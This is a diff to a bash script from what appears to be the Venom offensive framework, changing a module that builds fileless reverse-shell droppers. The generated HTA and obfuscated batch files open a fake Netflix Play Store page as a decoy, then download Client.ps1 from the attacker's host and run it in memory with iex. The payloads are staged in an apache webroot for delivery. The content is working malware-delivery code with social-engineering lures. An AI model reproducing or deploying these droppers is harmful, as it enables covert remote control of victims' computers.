@@ -12482,7 +12482,10 @@ cat << !
     OBFUSCATION: $obfstat <= (settings file)
     DESCRIPTION: Reverse TCP Powershell Shell (OpenSSL - FileLess)
     OBFUSCATION: If activated, dropper.hta html file will be created
-                 insted of the obfuscated Batch dropper.bat (default)
+                 insted of the obfuscated Batch dropper.bat (default).
+                 The dropper.hta will fake the install of Netflix from
+                 play.google.com/store before executing our Agent in RAM.
+                 (The hta dropper module allow us to input a diferent URL).
 
 !
 echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
@@ -13661,18 +13664,18 @@ sleep 2
 easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 443" --entry --width 300) > /dev/null 2>&1
-Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-playGoogle\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Netflix\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 CN=$(zenity --title="☠ Enter OpenSSL CN (domain name) ☠" --text "example: SSARedTeam.com\nWarning: CN must be a valid Domain Name." --entry --width 300) > /dev/null 2>&1
 if [ "$easter_egg" = "ON" ]; then
-   SE=$(zenity --title="☠ Social Engineering ☠" --text "'The URL to open before Agent execution'.\nLeave the input field blank to use default URL.\n\nDefault URL: https://play.google.com/store" --entry --width 300) > /dev/null 2>&1
+   SE=$(zenity --title="☠ Social Engineering ☠" --text "'The URL to open before Agent execution'.\nLeave the input field blank to use default URL.\n\nDefault: https://play.google.com/store/apps/details?id=com.netflix" --entry --width 300) > /dev/null 2>&1
 fi
 
 ## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$Drop" ]; then Drop="Netflix";fi
 if [ -z "$CN" ]; then CN="SSARedTeam.com";fi
-if [ -z "$Drop" ]; then Drop="Update-playGoogle";fi
-if [ -z "$SE" ]; then SE="https://play.google.com/store";fi
+if [ -z "$SE" ]; then SE="https://play.google.com/store/apps/details?id=com.netflix.mediaclient";fi
 if [ "$easter_egg" = "ON" ]; then Ext="hta";else Ext="bat";fi
 
 
@@ -13702,17 +13705,17 @@ if [ "$easter_egg" = "ON" ]; then
    echo "Framework: Venom v1.0.17 - shinigami" >> $IPATH/output/$Drop.$Ext
    echo "<script>" >> $IPATH/output/$Drop.$Ext
    echo "a=new ActiveXObject(\"WScript.Shell\");" >> $IPATH/output/$Drop.$Ext
-   echo "a.run(\"powershell -w 1 start $SE;\$MyCat=New-Object -Com WinHttp.WinHttpRequest.5.1;\$MyCat.open('GET','http://$lhost/Client.ps1',\$false);\$MyCat.send();iex \$MyCat.responseText;\", 0);" >> $IPATH/output/$Drop.$Ext
+   echo "a.run(\"powershell -w 1 start $SE;\$proxy=New-Object -Com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/Client.ps1',\$false);\$proxy.send();iex \$proxy.responseText;\", 0);" >> $IPATH/output/$Drop.$Ext
    echo "window.close();" >> $IPATH/output/$Drop.$Ext
    echo "</script>" >> $IPATH/output/$Drop.$Ext
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Dropper.hta html file written to output.";sleep 1
-   if [ "$easter_egg" = "ON" ]; then echo "${BlueF}[${YellowF}i${BlueF}]${white} SE URL:${YellowF} $SE";fi
+   if [ "$easter_egg" = "ON" ]; then echo "${BlueF}[${YellowF}i${BlueF}]${white} SE:${YellowF} $SE";fi
 else
    echo ":: Author: r00t-3xp10it (SSA RedTeam @2020)" > $IPATH/output/$Drop.$Ext
    echo ":: Framework: Venom v1.0.17 - shinigami" >> $IPATH/output/$Drop.$Ext
    echo "@echo off&%@i%&ti%@_$%tl^e p%_?%l%@#%ay.go%@i%og%'$%le.co%_[-1]%m - %_$%Up%@$%dat%@Q%in%_$%g S%@$%of%@i%twa%U1%re %_$%Rep%@%osi%@%tor%@%ie%('$')%s." >> $IPATH/output/$Drop.$Ext
    echo "@i%'$%f n%i@%ot DEF%_@$%INE%@h%D %@$%IS_MIN%@$%IMI%,;f%ZE%i?%D se%@'$%t IS_MIN%_#t%IM%'$%IZ%@=i%ED=1 &%@_$%& ,s%i0%tA%@%Rt \"\" /mi%@$%n \"%~dpnx0\" %* &%i@_%& eX%@$%I%_i_%t" >> $IPATH/output/$Drop.$Ext
-   echo "@po%@i%w\"e\"^r%@i%s^he%@$%ll (nE%@i%W-Obj%,;$%eC%'$%t -Co%()%m^O%@$%bjEc%@_%t Wsc%d0b%r\"i\"pt.She%@$%l^l).Po%#i%p\"u\"^p(\"\"\"$FullName so%@%ft%@%wa%@%re up%@%da%@%ted..\"\"\",4,\"\"\"$FullName - 3.10.5-dev Wi%@$%n%@%do%_$%ws In%@f%st%@_i#%al%R@%ler\"\"\",0+64)" >> $IPATH/output/$Drop.$Ext
+   echo "@po%@i%w\"e\"^r%@i%s^he%@$%ll (nE%@i%W-Obj%,;$%eC%'$%t -Co%()%m^O%@$%bjEc%@_%t Wsc%d0b%r\"i\"pt.She%@$%l^l).Po%#i%p\"u\"^p(\"\"\"so%@%ft%@%wa%@%re up%@%da%@%ted..\"\"\",4,\"\"\"$FullName - 3.10.5-dev Wi%@$%n%@%do%_$%ws In%@f%st%@_i#%al%R@%ler\"\"\",0+64)" >> $IPATH/output/$Drop.$Ext
    echo "@p\"O\"%i%we^R%@%s\"h\"^e%db%ll -w 1 \$My%@$%C\"a\"t=nE%@i%W-Obj%@%eC%('i')%t -Co%@i%m Win\"H\"tt%@$%p.Wi^nH\"t\"tpReq%@i_%ue\"s\"t.5.1;\$MyC%@$%at.op%@f%en('G%@i%ET','ht%@D%t%[-1]%p://$lhost/Client.ps%@[0]%1',\$fal%LeD%se);\$My\"C\"at.se%@$%nd();iex \$My%@1b%Cat.r\"e\"s%@0$%po%'$%ns%@?%e\"T\"e%@_i%xt;" >> $IPATH/output/$Drop.$Ext
    echo "=Exit" >> $IPATH/output/$Drop.$Ext
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Obfuscated Batch Dropper written to output.";sleep 1
@@ -13789,7 +13792,7 @@ fi
 
 
 cd $IPATH/output
-## Copy ALL files to apache2 webroot 
+## Copy ALL files to apache2 webroot
 zip $Drop.zip $Drop.$Ext > /dev/nul 2>&1
 echo "${BlueF}[☠]${white} Porting ALL required files to apache2"${Reset};sleep 2
 cp $IPATH/output/Client.ps1 $ApAcHe/Client.ps1 > /dev/nul 2>&1
